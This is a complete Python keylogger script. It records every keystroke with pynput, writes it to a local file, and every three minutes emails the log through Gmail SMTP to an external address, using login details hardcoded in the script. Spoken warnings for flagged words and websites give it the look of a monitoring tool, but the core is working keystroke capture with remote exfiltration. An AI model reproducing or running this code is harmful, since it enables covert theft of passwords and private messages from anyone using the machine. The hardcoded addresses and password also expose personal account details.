import re
import pyttsx3
from pynput.keyboard import Key, Listener
import smtplib
import time
from threading import Timer
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

word = ''
log_file = 'keylogger.txt'
warnings_file = 'warnings.txt'
email_interval = 180  # 3 minutes

bad_words = [...]
dangerous_sites = [...]

engine = pyttsx3.init()

def send_email():
    # Email setup
    from_address = "t613404486@gmail.com"
    to_address = "ayoubbnamar67@gmail.com"
    subject = "Keylogger Report"
    body = "Attached is the latest keylogger report."

    # Create the email
    msg = MIMEMultipart()
    msg['From'] = from_address
    msg['To'] = to_address
    msg['Subject'] = subject

    msg.attach(MIMEText(body, 'plain'))

    # Attach the keylogger.txt file
    with open(log_file, "rb") as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename= {log_file}")
        msg.attach(part)

    # Send the email
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(from_address, "test@1234")
        text = msg.as_string()
        server.sendmail(from_address, to_address, text)
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Failed to send email: {str(e)}")

def email_timer():
    # Call the email sending function every 3 minutes
    send_email()
    Timer(email_interval, email_timer).start()

def write_file(message, file, mode="w"):
    with open(file, mode) as f:
        f.write(message)

def log_warning(message):
    write_file(message + '\n', warnings_file, mode='a')

def warn_user(word):
    warning_message = ""
    if word.lower() in bad_words:
        warning_message = f"Warning: Bad word detected - {word}"
        print(warning_message)
        engine.say(warning_message)
        engine.runAndWait()
        log_warning(warning_message)
    
    if any(site in word.lower() for site in dangerous_sites):
        warning_message = f"Warning: Dangerous website detected - {word}"
        print(warning_message)
        engine.say(warning_message)
        engine.runAndWait()
        log_warning(warning_message)

def press(key):
    global word
    if key == Key.space:
        warn_user(word)
        word += ' '
        write_file(word, log_file, mode='a')
        word = ''
    elif re.search(r'Key\.', str(key)):
        warn_user(word)
        write_file('\n', log_file, mode='a')
        word = ''
    else:
        word += str(key).replace("'", "")
    
    print(word)
    print(f'{key}')

def release(key):
    global word
    if str(key) == 'Key.esc':
        if len(word) > 0:
            warn_user(word)
            print('write to the file')
            write_file(word, log_file, mode='a')
            word = ''
        send_email()  # Send email when the keylogger stops
        return False

# Start the email timer
email_timer()

with Listener(on_press=press, on_release=release) as listener:
    listener.join()
